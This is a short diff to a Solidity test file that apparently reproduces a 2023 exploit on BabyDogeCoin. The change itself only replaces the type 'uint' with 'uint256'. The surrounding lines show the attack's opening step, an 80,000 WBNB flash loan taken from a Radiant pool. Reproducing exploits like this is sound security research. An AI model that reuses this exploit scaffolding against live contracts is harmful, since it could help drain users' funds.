+++ src/test/2023-05/BabyDogeCoin_exp.sol
@@ -55,7 +55,7 @@ contract ContractTest is Test {
         assets[0] = address(WBNB);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 80_000 * 1e18;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);
